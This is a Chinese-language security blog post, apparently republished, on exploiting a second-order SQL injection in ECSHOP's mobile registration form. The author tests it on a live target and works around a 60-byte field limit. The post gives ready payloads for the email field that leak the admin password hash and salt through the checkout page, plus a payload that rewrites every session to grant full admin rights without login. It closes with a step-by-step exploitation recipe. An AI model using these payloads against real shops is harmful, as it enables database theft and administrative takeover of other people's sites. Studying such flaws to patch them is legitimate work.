> 原文链接: https://www.anquanke.com//post/id/82407 


# ECSHOP某二次注入利用姿势研究


                                阅读量   
                                **124905**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0109bb5aab6accb5f1.png)](https://p5.ssl.qhimg.com/t0109bb5aab6accb5f1.png)

最近渗透的时候遇到了ECSHOP，从网上搜了下，比较新的漏洞是乌云黑暗游侠提交的这两个注入

[ECSHOP最新全版本通杀注入](http://www.wooyun.org/bugs/wooyun-2010-086052)

[ECSHOP全版本通杀注射之2](http://www.wooyun.org/bugs/wooyun-2010-088561)

看了下细节，发现两个漏洞成因是一样的，都是出在手机版注册处，**由于手机版在注册时没有对传入的用户名、email做敏感字符的限制，导致了单引号的带入，然后在更新session的时候被带入查询形成二次注入。**

[![](https://p3.ssl.qhimg.com/t01ab2df2caec8c4709.png)](https://p3.ssl.qhimg.com/t01ab2df2caec8c4709.png)

测试了下目标站，发现确实存在漏洞，利用截图里的poc也成功获得了数据库的信息，但是当我进一步构造用户名准备获取管理员账号密码时却发现出不来数据，不是注册的时候就报错就是注册之后登录不上用户。

于是自己下载下来一套程序研究，发现注册的用户名都被截断了

[![](https://p5.ssl.qhimg.com/t0165f4c80ebfc54373.png)](https://p5.ssl.qhimg.com/t0165f4c80ebfc54373.png)

查看表结构：

[![](https://p5.ssl.qhimg.com/t01cb0dd15bf92ab752.png)](https://p5.ssl.qhimg.com/t01cb0dd15bf92ab752.png)

原来用户名和email都只允许60个字节的长度。掐指一算 感觉凭借自己的菜鸡水平估计是调不出直接报错拿管理员密码的exp了，于是想想别的方法。

既然是update型的注入，那就看看有没有输出点吧。

这个注入是在session表中出现的update型注入，因为session表中的数据是要更新到SESSION中的，所以找一个输出$_SESSION的地方应该不难。看了下程序源码，发现当用户登录后，用户中心显示用户名的地方可以输出数据，于是尝试构造用户名，将管理员密码update到session的user_name中。

但是我摸索半天却发现如果管理员只有一个还好，如果有多个，加上limit语句之后就超过了60字节

**',user_name=(select password from ecs_admin_user limit 0,1),ip='  （64字节）**

想了下，如果这样写，就正好可以满足60字符。

**',user_name=(select password from ecs_admin_user limit 0,1)#（60字节）**

但是这样子会将原本sql语句后面的where注释掉，致使所有用户的$_SESSION['user_name']都会被更新成管理员密码，显然不是一个完美的利用方式。

那还有什么更好的方法呢？想了想觉得唯一能缩短的地方也就是在user_name这里，那还有别的输出点么？读了下源代码，发现在用户购买商品时填写收货地址的地方，电子邮件地址是从$_SESSION['email']里取的，而将email作为输出点要比user_name短了4个字节

于是构造用户名 

**',email=(select password from ecs_admin_user limit 0,1),ip=' （60字节）**

正好是60个字节，但是经过测试发现然并卵..因为在程序的update语句中email出现在user_name后面，所以会被覆盖掉…

[![](https://p5.ssl.qhimg.com/t0155da142f1447e2d0.png)](https://p5.ssl.qhimg.com/t0155da142f1447e2d0.png)

忽然想起在第二个漏洞中提及email处其实也是可以带入单引号的，那我们直接将payload放在邮箱处注册，就可以防止被后面的赋值语句覆盖了。于是在邮箱地址处填入

**',email=(select password from ecs_admin_user limit 0,1),ip=' **

注册一个新用户，然后访问/flow.php?step=consignee，成功获得了管理员的hash。

[![](https://p2.ssl.qhimg.com/t0131d4ae6ffbe08926.png)](https://p2.ssl.qhimg.com/t0131d4ae6ffbe08926.png)

由于ecshop的管理员密码是有加salt的，我们还需要在注册一个用户来获得salt。

**',email=(select ec_salt from ecs_admin_user limit 0,1),ip=' **

[![](https://p3.ssl.qhimg.com/t01f8b98745663a7f12.png)](https://p3.ssl.qhimg.com/t01f8b98745663a7f12.png)

成功拿到password和salt后我兴奋的去解，结果显示未查到。。。

忽然感觉一盆冷水浇下。。正在我准备放弃的时候，我站在窗台，想了想mickey牛曾经说过的话：自己约的炮，含着泪也要打完。谨记大牛教诲，我冷静下来再想想该怎么利用。

看了下session表里的数据，忽然发现有一列叫做adminid，修改这个会不会直接就能访问后台了？我打开后台登录界面，然后试着把adminid数值改为1，果然可以访问管理界面了。但是后台的很多功能显示没有权限访问。

去读程序源码，发现程序会判断$_SESSION['action_list']，如果值为all，则可以使用所有功能，$_SESSION['action_list']是从session表的data列直接反序列化得到的。

[![](https://p1.ssl.qhimg.com/t013a46c032cde3cf7d.png)](https://p1.ssl.qhimg.com/t013a46c032cde3cf7d.png)

于是我尝试构造这样的邮箱

**',adminid='1',data='a:1:`{`s:11:"action_list";s:3:"all";`}`'#**

**将所有人的$_SESSION['adminid']设为1，$_SESSION['action_list']设为all。由于在update的语句中data项是在我们可控位置后面的，所以只能使用#注释掉后面的语句，将所有的session都改掉。不过还好，ecshop中后台管理员的session是独立生成的，所以如果之前没有访问过后台页面仍然是无法直接进入的，相对来说还是比较隐蔽的。**

在注册完用户后，刷新几下页面等session更新，然后我再次访问后台，果然直接绕过登陆可以使用所有功能了。

<br>

**总结下来，这个漏洞的最终的利用方法：**

****

**后台登录绕过：**

首先访问后台，建立session



然后访问/mobile/user.php?act=register

在email处填写

```
',adminid='1',data='a:1:`{`s:11:"action_list";s:3:"all";`}`'#
```

在前台登录后再次访问/admin/index.php 就可绕过登录操作后台所有功能。

**获取管理员password：**

访问/mobile/user.php?act=register

在email处填写

```
',email=(select password from ecs_admin_user limit 0,1),ip='
```

提交注册，在首页登录刚才注册的用户，然后访问<br>

/flow.php?step=consignee

即可获得password

**获取管理员salt：**

方法同上

```
',email=(select ec_salt from ecs_admin_user limit 0,1),ip='
```


